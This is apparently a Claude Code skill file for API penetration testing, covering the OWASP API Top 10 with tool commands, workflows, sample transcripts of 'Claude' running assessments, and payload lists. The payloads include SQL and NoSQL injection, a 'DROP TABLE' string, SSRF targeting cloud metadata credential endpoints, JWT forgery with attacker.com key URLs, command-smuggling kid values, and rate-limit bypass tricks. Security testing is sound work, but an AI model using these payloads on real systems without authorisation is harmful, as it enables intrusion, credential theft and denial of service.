---
name: api-security
description: "Comprehensive API security testing skill for REST, GraphQL, gRPC, and WebSocket APIs. Covers OWASP API Security Top 10 2023, authentication bypass, BOLA/BFLA, injection attacks, rate limiting bypass, and business logic flaws. Use when: 'test this API for vulnerabilities', 'pentest the REST API', 'GraphQL security assessment', 'API authentication testing', or 'OWASP API Top 10 audit'. (user)"
---

# API Security Testing

This skill enables comprehensive security testing of APIs including REST, GraphQL, gRPC, and WebSocket endpoints. It covers the full OWASP API Security Top 10 2023 methodology with automated testing, manual exploitation techniques, and detailed reporting.

## When to Use This Skill

This skill should be invoked when:
- Testing REST API endpoints for security vulnerabilities
- Performing GraphQL security assessments
- Testing gRPC services for authentication/authorization flaws
- Auditing WebSocket connections for security issues
- Performing OWASP API Security Top 10 compliance testing
- Testing API authentication mechanisms (JWT, OAuth, API keys)
- Finding BOLA/BFLA/IDOR vulnerabilities
- Testing rate limiting and resource exhaustion
- Analyzing API business logic for flaws
- Generating API security assessment reports

### Trigger Phrases
- "test this API for vulnerabilities"
- "pentest the REST API"
- "GraphQL security assessment"
- "API authentication testing"
- "find BOLA vulnerabilities in the API"
- "test JWT implementation"
- "OWASP API Top 10 audit"
- "fuzz these API endpoints"
- "test API rate limiting"
- "API security assessment"

---

## Prerequisites

### Required Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| curl | HTTP requests | Built-in |
| jq | JSON parsing | `apt install jq` |
| httpie | HTTP client | `pip install httpie` |
| Burp Suite | Traffic interception | Download from PortSwigger |
| Postman | API testing | Download from Postman |
| ffuf | Fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| sqlmap | SQL injection | `apt install sqlmap` |
| jwt_tool | JWT attacks | `pip install jwt_tool` |
| graphql-cop | GraphQL testing | `pip install graphql-cop` |
| Arjun | Parameter discovery | `pip install arjun` |
| kiterunner | API endpoint discovery | GitHub release |

### Environment Setup

```bash
# Install Python dependencies
pip install requests httpx aiohttp jwt pyjwt graphql-core

# Install API testing tools
pip install arjun jwt_tool graphql-cop

# Install fuzzing tools
go install github.com/ffuf/ffuf/v2@latest
go install github.com/assetnote/kiterunner/cmd/kr@latest

# Install Nuclei for template-based scanning
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

### Proxy Configuration

```bash
# Set proxy for API testing (Burp Suite)
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# For Python requests
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
```

---

## OWASP API Security Top 10 2023

| Rank | Vulnerability | Description | Severity |
|------|--------------|-------------|----------|
| API1 | Broken Object Level Authorization (BOLA) | Accessing other users' objects by manipulating IDs | Critical |
| API2 | Broken Authentication | Flaws in authentication mechanisms | Critical |
| API3 | Broken Object Property Level Authorization | Excessive data exposure / mass assignment | High |
| API4 | Unrestricted Resource Consumption | No rate limiting, DoS potential | High |
| API5 | Broken Function Level Authorization (BFLA) | Accessing unauthorized functions/admin endpoints | Critical |
| API6 | Unrestricted Access to Sensitive Business Flows | Abuse of business logic | High |
| API7 | Server Side Request Forgery (SSRF) | Making server-side requests to internal resources | High |
| API8 | Security Misconfiguration | Improper security settings | Medium |
| API9 | Improper Inventory Management | Exposed debug/old API versions | Medium |
| API10 | Unsafe Consumption of APIs | Trusting third-party API responses | Medium |

---

## Quick Start Guide

### 1. API Reconnaissance (5 minutes)

```bash
# Discover API endpoints from JavaScript files
python3 scripts/api_endpoint_extractor.py --url https://target.com --output endpoints.txt

# Use Kiterunner for API endpoint brute-forcing
kr scan https://api.target.com -w routes-large.kite -o results.txt

# Parameter discovery with Arjun
arjun -u https://api.target.com/users -m GET POST

# Check for OpenAPI/Swagger documentation
curl -s https://api.target.com/swagger.json | jq .
curl -s https://api.target.com/openapi.json | jq .
curl -s https://api.target.com/api-docs | jq .
```

### 2. Authentication Analysis (3 minutes)

```bash
# Analyze JWT token
python3 scripts/jwt_analyzer.py --token "eyJhbG..."

# Test for weak JWT secrets
jwt_tool "eyJhbG..." -C -d /path/to/wordlist.txt

# Check OAuth configuration
python3 scripts/oauth_tester.py --auth-url https://api.target.com/oauth/authorize
```

### 3. BOLA/IDOR Testing (5 minutes)

```bash
# Test object access with different IDs
python3 scripts/bola_tester.py \
  --endpoint "https://api.target.com/users/{id}/profile" \
  --auth-token "Bearer eyJ..." \
  --id-range 1-1000

# Automated IDOR scanner
python3 scripts/idor_scanner.py \
  --base-url https://api.target.com \
  --endpoints endpoints.txt \
  --user-a-token "token_a" \
  --user-b-token "token_b"
```

### 4. Injection Testing (5 minutes)

```bash
# SQL injection on API parameters
sqlmap -u "https://api.target.com/users?id=1" --batch --dbs

# NoSQL injection testing
python3 scripts/nosql_injector.py --url "https://api.target.com/login" \
  --data '{"username":"admin","password":"test"}'

# Command injection in API parameters
python3 scripts/api_fuzzer.py --url "https://api.target.com/ping" \
  --param "host" --payloads payloads/command_injection.txt
```

---

## Methodology Reference

| Document | Coverage |
|----------|----------|
| [methodology/reconnaissance.md](methodology/reconnaissance.md) | API discovery, documentation analysis, endpoint mapping |
| [methodology/authentication.md](methodology/authentication.md) | JWT, OAuth, API keys, session management |
| [methodology/authorization.md](methodology/authorization.md) | BOLA, BFLA, IDOR, access control testing |
| [methodology/injection.md](methodology/injection.md) | SQLi, NoSQLi, command injection, SSRF |
| [methodology/business_logic.md](methodology/business_logic.md) | Rate limiting, business flow abuse |
| [methodology/graphql.md](methodology/graphql.md) | GraphQL-specific security testing |
| [methodology/grpc.md](methodology/grpc.md) | gRPC security testing |
| [methodology/websocket.md](methodology/websocket.md) | WebSocket security testing |

---

## Detailed Testing Workflows

### Workflow 1: Complete API Security Assessment

```python
# Phase 1: Reconnaissance
# Discover all API endpoints
endpoints = discover_endpoints("https://api.target.com")
# Parse OpenAPI/Swagger specs
spec = parse_openapi("https://api.target.com/openapi.json")
# Extract endpoints from JavaScript
js_endpoints = extract_from_js("https://target.com")

# Phase 2: Authentication Testing
# Analyze authentication mechanisms
auth_analysis = analyze_auth(endpoints)
# Test JWT implementation
jwt_vulns = test_jwt(auth_token)
# Test OAuth flows
oauth_vulns = test_oauth(oauth_config)

# Phase 3: Authorization Testing (BOLA/BFLA)
# Test horizontal privilege escalation
bola_vulns = test_bola(endpoints, user_a_token, user_b_token)
# Test vertical privilege escalation
bfla_vulns = test_bfla(endpoints, user_token, admin_endpoints)

# Phase 4: Injection Testing
# SQL injection
sqli_vulns = test_sqli(endpoints)
# NoSQL injection
nosqli_vulns = test_nosqli(endpoints)
# SSRF
ssrf_vulns = test_ssrf(endpoints)

# Phase 5: Business Logic Testing
# Rate limiting
rate_vulns = test_rate_limiting(endpoints)
# Business flow abuse
logic_vulns = test_business_logic(endpoints)

# Phase 6: Report Generation
generate_report(all_vulns, "api_security_report.html")
```

### Workflow 2: JWT Attack Chain

```python
# Step 1: Decode and analyze JWT
jwt_tool "eyJhbG..." -T

# Step 2: Test algorithm confusion (RS256 -> HS256)
jwt_tool "eyJhbG..." -X k -pk public_key.pem

# Step 3: Test none algorithm
jwt_tool "eyJhbG..." -X a

# Step 4: Brute force weak secret
jwt_tool "eyJhbG..." -C -d rockyou.txt

# Step 5: Test kid parameter injection
jwt_tool "eyJhbG..." -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Step 6: Test jku/x5u header injection
jwt_tool "eyJhbG..." -X s -ju "https://attacker.com/jwks.json"

# Step 7: Test claim manipulation
jwt_tool "eyJhbG..." -I -pc role -pv admin
```

### Workflow 3: GraphQL Security Testing

```python
# Step 1: Introspection query
python3 scripts/graphql_introspection.py --url https://api.target.com/graphql

# Step 2: Schema analysis
python3 scripts/graphql_analyzer.py --schema schema.json

# Step 3: Query complexity attacks
python3 scripts/graphql_dos.py --url https://api.target.com/graphql \
  --depth 10 --breadth 10

# Step 4: Batch query attacks
python3 scripts/graphql_batch.py --url https://api.target.com/graphql \
  --query "mutation { login(user: \"FUZZ\", pass: \"FUZZ\") { token } }" \
  --wordlist users.txt

# Step 5: Field suggestion exploitation
python3 scripts/graphql_field_fuzzer.py --url https://api.target.com/graphql

# Step 6: Authorization bypass via alias
python3 scripts/graphql_alias_bypass.py --url https://api.target.com/graphql \
  --query "{ user(id: 1) { email } }"
```

### Workflow 4: BOLA/IDOR Exploitation

```python
# Step 1: Identify endpoints with object references
# Look for: /users/{id}, /orders/{order_id}, /files/{file_id}

# Step 2: Collect IDs accessible to User A
user_a_ids = collect_ids(endpoints, user_a_token)
# Example: [123, 456, 789]

# Step 3: Attempt access with User B's token
for endpoint in endpoints:
    for id in user_a_ids:
        response = requests.get(
            endpoint.format(id=id),
            headers={"Authorization": f"Bearer {user_b_token}"}
        )
        if response.status_code == 200:
            print(f"[VULN] BOLA: {endpoint} - ID {id} accessible")

# Step 4: Test ID enumeration
for id in range(1, 10000):
    response = requests.get(
        f"https://api.target.com/users/{id}",
        headers={"Authorization": f"Bearer {user_token}"}
    )
    if response.status_code == 200:
        print(f"[INFO] Found user: {id}")

# Step 5: Test alternative ID formats
# UUID: /users/550e8400-e29b-41d4-a716-446655440000
# Hash: /users/5f4dcc3b5aa765d61d8327deb882cf99
# Encoded: /users/MTIz (base64 of 123)
```

### Workflow 5: API Rate Limiting Bypass

```python
# Technique 1: Header manipulation
headers_bypass = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": f"10.0.0.{random.randint(1,255)}"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
]

# Technique 2: Case variation
endpoints_case = [
    "/api/login",
    "/API/login",
    "/api/LOGIN",
    "/Api/Login",
    "/api/login/",
    "/api//login",
    "/api/./login",
]

# Technique 3: Parameter pollution
params_bypass = [
    "?id=1&id=2",
    "?id[]=1",
    "?id=1%00",
]

# Technique 4: HTTP method override
method_override = [
    {"X-HTTP-Method-Override": "POST"},
    {"X-HTTP-Method": "POST"},
    {"X-Method-Override": "POST"},
]
```

---

## Tool Reference

### API Testing Tools

| Tool | Description | Example |
|------|-------------|---------|
| `api_endpoint_extractor.py` | Extract endpoints from JS files | `python3 scripts/api_endpoint_extractor.py --url https://target.com` |
| `jwt_analyzer.py` | Analyze JWT tokens | `python3 scripts/jwt_analyzer.py --token "eyJ..."` |
| `bola_tester.py` | Test for BOLA/IDOR | `python3 scripts/bola_tester.py --endpoint "/users/{id}"` |
| `graphql_introspection.py` | GraphQL schema dump | `python3 scripts/graphql_introspection.py --url https://api/graphql` |
| `api_fuzzer.py` | Fuzz API parameters | `python3 scripts/api_fuzzer.py --url https://api/endpoint` |
| `oauth_tester.py` | Test OAuth flows | `python3 scripts/oauth_tester.py --auth-url https://api/oauth` |
| `rate_limit_tester.py` | Test rate limiting | `python3 scripts/rate_limit_tester.py --url https://api/login` |
| `nosql_injector.py` | NoSQL injection | `python3 scripts/nosql_injector.py --url https://api/login` |
| `api_report_generator.py` | Generate reports | `python3 scripts/api_report_generator.py --results results.json` |

### Payload Categories

| Category | File | Contents |
|----------|------|----------|
| SQL Injection | `payloads/sqli.txt` | 500+ SQL injection payloads |
| NoSQL Injection | `payloads/nosqli.txt` | MongoDB, CouchDB payloads |
| Command Injection | `payloads/cmdi.txt` | OS command injection |
| SSRF | `payloads/ssrf.txt` | SSRF bypass payloads |
| JWT | `payloads/jwt.txt` | JWT attack payloads |
| GraphQL | `payloads/graphql.txt` | GraphQL-specific attacks |
| BOLA | `payloads/bola.txt` | ID enumeration patterns |
| Headers | `payloads/headers.txt` | Header injection payloads |

---

## Attack Payloads Reference

### SQL Injection Payloads for APIs

```
# Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,NULL FROM users--

# Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' AND pg_sleep(5)--
' AND DBMS_LOCK.SLEEP(5)--

# Boolean-based
' AND '1'='1'--
' AND '1'='2'--
' AND 1=1--
' AND 1=2--

# JSON API specific
{"id": "1' OR '1'='1"}
{"id": {"$gt": ""}}
{"id": "1; DROP TABLE users--"}
```

### NoSQL Injection Payloads

```json
// MongoDB operator injection
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}

// MongoDB $where injection
{"$where": "sleep(5000)"}
{"$where": "this.username == 'admin'"}
{"username": {"$where": "sleep(5000)"}}

// Array injection
{"username": ["admin"], "password": {"$ne": ""}}

// Type juggling
{"username": "admin", "password": true}
{"username": "admin", "password": []}
{"username": "admin", "password": null}
```

### SSRF Payloads

```
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP metadata (requires header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata (requires header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# IP bypass techniques
http://127.0.0.1/
http://localhost/
http://127.1/
http://0.0.0.0/
http://0/
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://127.0.0.1.nip.io/
http://2130706433/ (decimal IP)
http://0x7f000001/ (hex IP)
http://017700000001/ (octal IP)

# URL parsing bypass
http://127.0.0.1:80\@attacker.com/
http://attacker.com#@127.0.0.1/
http://127.0.0.1%23@attacker.com/
http://attacker.com\@127.0.0.1/
```

### JWT Attack Payloads

```python
# None algorithm attack
# Original: {"alg":"RS256","typ":"JWT"}
# Attack:   {"alg":"none","typ":"JWT"}

# Algorithm confusion (RS256 to HS256)
# Use public key as HMAC secret

# Kid parameter injection
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
{"alg":"HS256","typ":"JWT","kid":"| ls -la"}
{"alg":"HS256","typ":"JWT","kid":"'; SELECT * FROM secrets--"}

# JKU/X5U header injection
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

# Claim tampering
# Change: {"role":"user"} to {"role":"admin"}
# Change: {"user_id":123} to {"user_id":1}
# Add: {"is_admin":true}
```

### GraphQL Attack Payloads

```graphql
# Introspection query
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Deeply nested query (DoS)
{
  users {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}

# Batch query attack (brute force)
[
  {"query": "mutation { login(user:\"admin\",pass:\"password1\") { token }}"},
  {"query": "mutation { login(user:\"admin\",pass:\"password2\") { token }}"},
  {"query": "mutation { login(user:\"admin\",pass:\"password3\") { token }}"}
]

# Alias-based attack
{
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  a3: user(id: 3) { email }
  a4: user(id: 4) { email }
}

# Field suggestion exploitation
{ users { __typename } }
# Then try suggested fields

# Directive abuse
{ users @include(if: true) { email } }
{ users @skip(if: false) { email } }
```

---

## Example Claude Code Interactions

### Example 1: Complete API Security Assessment

```
User: Test https://api.example.com for security vulnerabilities. I have a valid
JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Claude: I'll perform a comprehensive API security assessment on https://api.example.com.

[Phase 1: Reconnaissance]

1. Checking for API documentation:
   > curl -s https://api.example.com/swagger.json

   Found OpenAPI spec with 47 endpoints:
   - 12 GET endpoints
   - 18 POST endpoints
   - 10 PUT endpoints
   - 7 DELETE endpoints

2. Analyzing JWT token:
   > python3 scripts/jwt_analyzer.py --token "eyJhbG..."

   Header: {"alg": "HS256", "typ": "JWT"}
   Payload: {"user_id": 123, "role": "user", "exp": 1735689600}

   [!] Weak algorithm: HS256 (susceptible to brute force)
   [!] Sensitive data in payload: user_id exposed

[Phase 2: Authentication Testing]

1. Testing JWT secret strength:
   > jwt_tool "eyJhbG..." -C -d rockyou.txt

   [!] CRITICAL: Weak secret found: "secret123"
   Can forge arbitrary tokens!

2. Testing algorithm confusion:
   > jwt_tool "eyJhbG..." -X a

   [!] HIGH: None algorithm accepted
   Can bypass authentication entirely

[Phase 3: Authorization Testing (BOLA)]

1. Testing horizontal privilege escalation:
   > python3 scripts/bola_tester.py --endpoint "/users/{id}/profile"

   [!] CRITICAL: BOLA vulnerability confirmed
   - User 123 can access profiles of users 1-500
   - Sensitive data exposed: email, phone, address

2. Testing vertical privilege escalation:
   > GET /admin/users with user token

   [!] HIGH: BFLA - Admin endpoint accessible to regular user

[Phase 4: Injection Testing]

1. SQL Injection:
   > sqlmap -u "https://api.example.com/search?q=test" --batch

   [!] HIGH: SQL injection in 'q' parameter
   Database: MySQL 8.0
   Tables found: users, orders, payments

2. NoSQL Injection:
   > POST /login with {"username": {"$ne": ""}}

   [!] CRITICAL: NoSQL injection - authentication bypass

[Phase 5: Summary]

| Severity | Count | Issues |
|----------|-------|--------|
| Critical | 4 | JWT forgery, BOLA, NoSQLi, Auth bypass |
| High | 3 | SQLi, BFLA, Weak JWT |
| Medium | 5 | Info disclosure, missing rate limiting |

Full report generated: reports/api-example-com-report.html
```

### Example 2: GraphQL Security Testing

```
User: Test the GraphQL API at https://api.target.com/graphql

Claude: I'll perform a comprehensive GraphQL security assessment.

[Phase 1: Introspection]

> python3 scripts/graphql_introspection.py --url https://api.target.com/graphql

Schema retrieved successfully:
- 23 Query types
- 12 Mutation types
- 45 Object types

Notable types found:
- User (email, password_hash, ssn)
- AdminSettings (api_keys, secrets)
- InternalConfig (debug_mode, db_connection)

[!] HIGH: Sensitive fields exposed in schema

[Phase 2: Authorization Testing]

Testing field-level access control:

> query { user(id: 1) { email password_hash ssn } }

[!] CRITICAL: password_hash field accessible
[!] CRITICAL: SSN field accessible without authorization

Testing admin queries with user token:

> query { adminSettings { api_keys } }

[!] HIGH: Admin data accessible to regular users

[Phase 3: Query Complexity Attack]

> python3 scripts/graphql_dos.py --depth 15

[!] MEDIUM: No query depth limiting
Server responded to deeply nested query (15 levels)
Potential DoS vector identified

[Phase 4: Batch Attack Testing]

> python3 scripts/graphql_batch.py --query "mutation login"

[!] HIGH: Batch queries enabled
Can perform password brute force: 100 attempts/request
Rate limiting bypassed via batching

[Phase 5: Alias-based IDOR]

> query {
    u1: user(id:1) { email }
    u2: user(id:2) { email }
    ...
    u100: user(id:100) { email }
  }

[!] CRITICAL: Mass data extraction via aliases
Retrieved 100 user emails in single request

Summary: 4 Critical, 3 High, 2 Medium findings
Report: reports/graphql-target-report.html
```

### Example 3: OAuth Security Testing

```
User: Test the OAuth implementation at https://auth.example.com

Claude: I'll analyze the OAuth 2.0 implementation for security issues.

[Phase 1: Configuration Analysis]

> curl https://auth.example.com/.well-known/oauth-authorization-server

OAuth Configuration:
- Authorization endpoint: /oauth/authorize
- Token endpoint: /oauth/token
- Supported flows: authorization_code, implicit, client_credentials
- PKCE: Not required

[!] MEDIUM: Implicit flow enabled (deprecated, insecure)
[!] HIGH: PKCE not enforced for public clients

[Phase 2: Redirect URI Testing]

Testing open redirect in redirect_uri:

> /oauth/authorize?redirect_uri=https://evil.com
[+] Blocked: Invalid redirect_uri

> /oauth/authorize?redirect_uri=https://example.com.evil.com
[!] HIGH: Subdomain matching bypass accepted

> /oauth/authorize?redirect_uri=https://example.com/callback/../../../evil
[!] HIGH: Path traversal in redirect_uri accepted

[Phase 3: State Parameter Testing]

> /oauth/authorize?state= (empty)
[!] MEDIUM: Empty state accepted - CSRF possible

> /oauth/authorize (no state)
[!] HIGH: Missing state not rejected

[Phase 4: Token Testing]

Testing token theft scenarios:

> Authorization code reuse
[!] HIGH: Code can be used multiple times

> Token in URL fragment
[!] MEDIUM: Access token exposed in browser history (implicit flow)

[Phase 5: Client Authentication]

> POST /oauth/token with no client_secret
[!] CRITICAL: Token endpoint accepts requests without client authentication

Summary:
- 2 Critical (client auth, code reuse)
- 4 High (PKCE, redirect bypass, state)
- 3 Medium (implicit flow, token exposure)

Remediation guide: reports/oauth-remediation.html
```

---

## Troubleshooting Guide

### Common Issues

**API returns 401 Unauthorized**
```bash
# Check token expiration
python3 scripts/jwt_analyzer.py --token "$TOKEN" --check-exp

# Refresh token if needed
curl -X POST https://api.target.com/auth/refresh \
  -H "Authorization: Bearer $REFRESH_TOKEN"
```

**Rate limiting blocking tests**
```bash
# Use rate limit bypass techniques
python3 scripts/rate_limit_bypass.py --url https://api.target.com/login

# Rotate through IPs
python3 scripts/api_fuzzer.py --url https://api.target.com \
  --proxy-list proxies.txt
```

**GraphQL introspection disabled**
```bash
# Try field suggestion
python3 scripts/graphql_field_fuzzer.py --url https://api.target.com/graphql

# Check for alternative introspection endpoints
curl https://api.target.com/graphql/schema
curl https://api.target.com/graphql?query={__schema{types{name}}}
```

**JWT secret not cracking**
```bash
# Try larger wordlists
jwt_tool "$TOKEN" -C -d /path/to/large-wordlist.txt

# Try hashcat for GPU acceleration
hashcat -m 16500 jwt_hash.txt wordlist.txt
```

---

## Checklists Reference

| Checklist | Purpose |
|-----------|---------|
| [checklists/owasp_api_top10.md](checklists/owasp_api_top10.md) | Complete OWASP API Top 10 testing |
| [checklists/jwt_testing.md](checklists/jwt_testing.md) | JWT security checklist |
| [checklists/graphql_testing.md](checklists/graphql_testing.md) | GraphQL security checklist |
| [checklists/oauth_testing.md](checklists/oauth_testing.md) | OAuth 2.0 security checklist |
| [checklists/quick_wins.md](checklists/quick_wins.md) | Fast vulnerability discovery |

---

## Templates Reference

| Template | Purpose |
|----------|---------|
| [templates/finding_template.md](templates/finding_template.md) | Individual vulnerability documentation |
| [templates/executive_summary.md](templates/executive_summary.md) | Management-level summary |
| [templates/technical_report.md](templates/technical_report.md) | Full technical assessment report |
| [templates/api_inventory.md](templates/api_inventory.md) | API endpoint documentation |

---

## CI/CD Integration

### GitHub Actions Example

```yaml
name: API Security Scan

on:
  push:
    branches: [main]
  schedule:
    - cron: '0 2 * * *'

jobs:
  api-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Run API Security Scan
        run: |
          python3 scripts/api_security_scanner.py \
            --target ${{ secrets.API_URL }} \
            --token ${{ secrets.API_TOKEN }} \
            --output results/api-scan.json

      - name: Check for Critical Findings
        run: |
          python3 scripts/check_findings.py \
            --report results/api-scan.json \
            --fail-on critical,high

      - name: Upload Results
        uses: actions/upload-artifact@v3
        with:
          name: api-security-report
          path: results/
```

---

## Related Resources

- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [OWASP API Security Project](https://owasp.org/www-project-api-security/)
- [GraphQL Security Best Practices](https://graphql.org/learn/security/)
- [JWT Best Practices (RFC 8725)](https://datatracker.ietf.org/doc/html/rfc8725)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---

## Bundled Scripts

### scripts/
- `api_endpoint_extractor.py` - Extract API endpoints from JS files
- `jwt_analyzer.py` - JWT token analysis and attack
- `bola_tester.py` - BOLA/IDOR vulnerability testing
- `graphql_introspection.py` - GraphQL schema extraction
- `graphql_analyzer.py` - GraphQL security analysis
- `graphql_dos.py` - GraphQL complexity attacks
- `oauth_tester.py` - OAuth 2.0 security testing
- `api_fuzzer.py` - API parameter fuzzing
- `nosql_injector.py` - NoSQL injection testing
- `rate_limit_tester.py` - Rate limiting analysis
- `api_security_scanner.py` - Automated security scanning
- `api_report_generator.py` - Report generation

### payloads/
- `sqli.txt` - SQL injection payloads
- `nosqli.txt` - NoSQL injection payloads
- `ssrf.txt` - SSRF payloads
- `jwt.txt` - JWT attack payloads
- `graphql.txt` - GraphQL attack payloads
- `headers.txt` - Header injection payloads
- `bola.txt` - ID enumeration patterns
- `command_injection.txt` - Command injection payloads
